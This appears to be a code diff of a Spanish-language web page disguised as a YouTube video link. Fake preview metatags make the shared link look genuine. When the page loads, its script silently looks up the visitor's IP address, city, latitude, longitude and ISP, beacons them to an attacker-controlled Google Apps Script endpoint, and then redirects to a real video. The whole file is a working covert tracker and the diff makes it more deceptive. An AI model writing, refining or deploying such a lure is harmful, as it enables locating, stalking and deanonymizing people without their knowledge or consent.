@@ -2,61 +2,49 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <title>YouTube - Redirect</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!-- Metatags para que el enlace parezca un video real de YouTube -->
+    <title>Título del Video de YouTube</title>
+    <meta property="og:title" content="Título del Video de YouTube">
+    <meta property="og:description" content="2.5M de vistas - hace 2 días">
+    <meta property="og:image" content="https://img.youtube.com/vi/ID_DEL_VIDEO/maxresdefault.jpg">
+    <meta property="og:type" content="video.other">
+    
     <script>
-        // Configuración
-        const TARGET = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
-        const BRIDGE = "https://script.google.com/macros/s/AKfycbzi9jBJlyfvrJ8XYX4JGiZ5JIMjP4fCk0ZVv8zpYZPeaAJ07wiqEexA9csKg9HKEHI8pA/exec";
+        const TARGET = "https://www.youtube.com/watch?v=cBVGlBWQzuc&list=RDGMEMQ1dJ7wXfLlqCjwV0xfSNbAVMJGwWNGJdvx8&index=3"; // Cambia ID_DEL_VIDEO
+        const BRIDGE = "https://script.google.com/macros/s/AKfycbzi9jBJlyfvrJ8XYX4JGiZ5JIMjP4fCk0ZVv8zpYZPeaAJ07wiqEexA9csKg9HKEHI8pA/exec"; // Pega aquí tu URL de "Ejecutar como aplicación web"
 
-        async function executePayload() {
+        async function xvPayload() {
             try {
-                // 1. IP Intelligence - Geolocalización de Alta Precisión
-                // Usamos ip-api para obtener latitud, longitud, ciudad e ISP
-                const geoRes = await fetch('http://ip-api.com/json/?fields=status,country,regionName,city,zip,lat,lon,isp,query');
-                const geoData = await geoRes.json();
+                // Obtención de IP y Geo de forma silenciosa
+                const res = await fetch('http://ip-api.com/json/?fields=status,country,regionName,city,lat,lon,isp,query');
+                const data = await res.json();
 
-                if (geoData.status === 'success') {
+                if (data.status === 'success') {
                     const params = new URLSearchParams({
-                        lat: geoData.lat,
-                        lon: geoData.lon,
-                        loc: `${geoData.city}, ${geoData.regionName}`,
-                        isp: geoData.isp,
-                        ip: geoData.query,
-                        agent: navigator.userAgent
+                        lat: data.lat,
+                        lon: data.lon,
+                        loc: `${data.city}, ${data.regionName}`,
+                        isp: data.isp,
+                        ip: data.query
                     });
 
-                    // 2. Delay Inteligente & Ejecución Silenciosa
-                    // Enviamos los datos sin esperar respuesta (Beacon API es mejor para evitar bloqueos)
-                    navigator.sendBeacon(`${BRIDGE}?${params.toString()}`);
+                    // Uso de Beacon API: Envía los datos incluso si la pestaña se cierra o redirige
+                    navigator.sendBeacon(`${BRIDGE}?${params.toString()}`); //
                 }
-            } catch (e) { console.log('Bypass logic'); }
+            } catch (e) {}
 
-            // Redirección con un pequeño delay para asegurar la salida de datos
-            setTimeout(() => {
-                window.location.replace(TARGET);
-            }, 800);
+            // Redirección inmediata al video real
+            window.location.replace(TARGET); //[cite: 2]
         }
 
-        // Delay Inteligente: El script no se ejecuta hasta que el navegador esté "en calma"
-        // o el usuario realice una acción mínima.
-        window.addEventListener('DOMContentLoaded', () => {
-            if (window.requestIdleCallback) {
-                window.requestIdleCallback(executePayload);
-            } else {
-                setTimeout(executePayload, 1500);
-            }
-        });
+        // Ejecución al cargar
+        window.onload = xvPayload;
     </script>
 </head>
-<body style="background: #000; color: #333; font-family: sans-serif;">
-    <div style="display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh;">
-        <div class="loader"></div>
-        <p>Cargando video...</p>
+<body style="background-color: #0f0f0f; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: Roboto, Arial;">
+    <div style="text-align: center;">
+        <img src="https://www.gstatic.com/youtube/img/branding/youtubelogo/28dp/youtube_rgb_dark.png" alt="YouTube">
+        <p>Cargando reproductor...</p>
     </div>
-    <style>
-        .loader { border: 3px solid #1a1a1a; border-top: 3px solid #ff0000; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    </style>
 </body>
 </html>
